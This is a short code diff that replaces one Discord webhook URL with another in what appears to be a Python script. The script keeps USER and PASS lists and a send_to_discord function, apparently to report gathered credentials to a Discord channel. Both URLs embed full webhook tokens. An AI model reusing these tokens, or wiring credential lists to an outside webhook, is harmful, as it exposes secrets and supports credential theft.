@@ -18,7 +18,7 @@ USER=[]
 PASS=[]
 total_list=0
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1238527840765480970/ATWKuKsyRiYiDNX-cy8ipxvA1WPQARdHZDNNTKxqS4HcfQ0KW07vMSg4OAlWecfmmARg"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1239116820452085800/3WDARGDAR9hoyZcGAja3_2y4nDZi5xwAaBl-E9fyPBNMyQ-ZwrvItxXANx1DlvU2BPeN"
 
 def send_to_discord(message):
     payload = {
